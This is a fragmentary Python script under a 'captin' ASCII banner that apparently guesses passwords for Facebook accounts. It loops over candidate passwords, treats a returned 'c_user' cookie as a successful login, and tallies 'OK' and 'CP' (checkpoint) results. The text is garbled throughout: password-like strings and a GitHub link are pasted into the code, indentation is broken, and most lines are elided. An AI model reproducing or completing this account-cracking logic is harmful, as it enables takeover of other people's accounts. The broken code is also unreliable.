...
| $$       /$$__  $$| $$  | $$  | $$ /$$| $$| $$  | $$
|  $$$$$$$|  $$$$$$$| $$$$$$$/  |  $$$$/| $$| $$  | $$
 \_______/ \_______/| $$____/    \___/  |__/|__/  |__/
                    | $$                              
                    | $$                              
                    |__/                              
...
def i():
    ...
    for bilal in range(passx):
        ...
        hama123123
     hiwa1212
     hiwa123https://github.com/mmkahhadd/captin.git
     append(pww)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write('\r               %s[%s/%s]  [OK captin:%s]  [CP captin:%s] \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass hama7070
